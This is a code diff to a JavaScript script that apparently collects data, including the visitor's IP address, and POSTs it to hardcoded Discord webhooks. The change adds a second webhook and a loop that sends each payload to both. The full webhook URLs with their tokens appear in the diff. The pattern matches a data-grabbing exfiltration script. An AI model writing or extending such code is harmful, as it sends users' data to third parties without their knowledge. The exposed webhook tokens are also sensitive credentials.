@@ -1,17 +1,37 @@
 (function() {
-    const WEBHOOK = "https://discord.com/api/webhooks/1510600905853108315/gg6Evk5crnNyA7BA6f6wCyObrc0n_OMutzwSLscFmpdn9WkpizHP1iN_KN4fjIQW1685";
+    const WEBHOOKS = [
+        "https://discord.com/api/webhooks/1510600905853108315/gg6Evk5crnNyA7BA6f6wCyObrc0n_OMutzwSLscFmpdn9WkpizHP1iN_KN4fjIQW1685",
+        "https://discord.com/api/webhooks/1510617426952327168/XXLauZ_BKgomkxXnUf6OZstPKekfSvIcrAeorqJiQwKzNOaQwOiIqGd_gVYsMiF-LW6G",
+    ];
 
-    async function sendData(content) {
+    async function sendToWebhook(webhook, content) {
         try {
-            await fetch(WEBHOOK, {
+            await fetch(webhook, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ content: content })
             });
-            console.log("✅ Sent to webhook");
+            return true;
         } catch(e) {
-            console.error("❌ Failed to send");
+            return false;
         }
+    }
+
+    async function sendData(content) {
+        let successCount = 0;
+        let failCount = 0;
+        
+        for (const webhook of WEBHOOKS) {
+            const result = await sendToWebhook(webhook, content);
+            if (result) {
+                successCount++;
+                console.log(`✅ Sent to webhook ${successCount + failCount}`);
+            } else {
+                failCount++;
+                console.error(`❌ Failed to send to webhook ${successCount + failCount}`);
+            }
+        }
+        console.log(`📊 Summary: ${successCount} succeeded, ${failCount} failed`);
     }
 
     async function getIP() {
